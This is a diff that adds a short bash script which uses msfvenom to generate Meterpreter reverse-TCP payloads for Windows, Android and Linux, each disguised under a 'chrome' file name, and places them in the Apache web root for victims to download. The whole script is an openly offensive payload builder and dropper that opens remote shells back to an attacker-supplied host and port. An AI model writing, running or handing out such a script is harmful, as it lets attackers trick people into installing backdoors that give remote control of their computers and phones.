@@ -1,0 +1,34 @@
+#!/bin/bash
+echo "[*]Starting apache server"
+service apache start &> /dev/null
+service apache1 start &> /dev/null
+service apache2 start &> /dev/null
+service apache3 start &> /dev/null
+read -p "Enter your LHOST: " host
+echo
+read -p "Enter your LPORT: " port
+echo
+read -p "Enter system type (x86,x64): " types
+echo
+echo "[*]Startng msfvenom"
+sleep 0.5
+echo "[*]Making Windows payload"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port >/root/chrome.exe 
+mv /root/chrome.exe /var/www/html
+echo "[*]Setting up server"
+echo
+echo "[*]Making Android payload"
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port  >/root/chrome.apk 
+mv /root/chrome.apk /var/www/html
+echo "[*]Setting up server"
+echo "[*]Making Linux payload"
+msfvenom -p linux/$types/meterpreter/reverse_tcp LHOST=$host LPORT=$port  >/root/chrome.elf
+mv /root/chrome.elf /var/www/html
+echo "[*]Setting up server"
+opreation=$?
+if [ $opreation == 0 ]
+then 
+	echo "Done"
+else
+echo "Error maybe you dont install metasploit or dont install apache server"
+fi
